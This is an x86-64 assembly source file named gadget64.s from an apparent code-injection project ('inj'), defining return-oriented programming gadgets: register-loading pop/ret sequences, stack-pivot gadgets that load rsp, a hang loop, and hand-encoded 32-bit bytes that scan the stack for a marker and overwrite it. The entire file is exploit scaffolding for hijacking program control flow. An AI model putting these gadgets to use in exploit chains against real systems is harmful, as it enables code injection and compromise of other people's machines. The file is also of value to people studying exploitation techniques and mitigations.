//
//  gadget64.s
//  inj
//
//  Created by qwertyoruiop on 31/07/15.
//  Copyright (c) 2015 kim jong cracks. All rights reserved.
//


.globl _gadgets
.globl _end_gadgets
.globl _ROP_RET
.globl _ROP_POP_POP_RSP
.globl _ROP_POP_RDI
.globl _ROP_POP_RSI
.globl _ROP_POP_RDX
.globl _ROP_POP_RCX
.globl _ROP_RAX_TO_RDI
.globl _ROP_RSP_TO_RCX
.globl _ROP_RDI_TO_RSP
.globl _ROP_ADD200H_RCX
.globl _ROP_HUNT_REPLACE_200H_RSP
.globl _ROP_HANG


_gadgets:
    nop;

_ROP_RET:
    retq;
_ROP_POP_POP_RSP:
    pop %rax;
    pop %rsp;
    retq;
_ROP_POP_RDI:
    pop %rdi;
    retq;
_ROP_POP_RSI:
    pop %rsi;
    retq;
_ROP_POP_RDX:
    pop %rdx;
    retq;
_ROP_POP_RCX:
    pop %rcx;
    retq;
_ROP_RAX_TO_RDI:
    mov %rax, %rdi;
    retq;
_ROP_RDI_TO_RSP:
    mov %rdi, %rsp;
    retq;
_ROP_RSP_TO_RCX:
    mov %rsp, %rcx
    retq;
_ROP_ADD200H_RCX:
    addq $0x200, %rcx
    retq;
_ROP_HANG:
    jmp _ROP_HANG;
_ROP_HUNT_REPLACE_200H_RSP: // 32 bit code
    .byte 0xbb, 0x44, 0x44, 0x44, 0x44, 0x31, 0xc0, 0x89, 0xe1, 0x01, 0xc1, 0x39, 0x19, 0x74, 0x05, 0x83, 0xc0, 0x04, 0xeb, 0xf3, 0x89, 0x21, 0x81, 0x01, 0x00, 0x02, 0x00, 0x00, 0xc3
_end_gadgets:
    nop;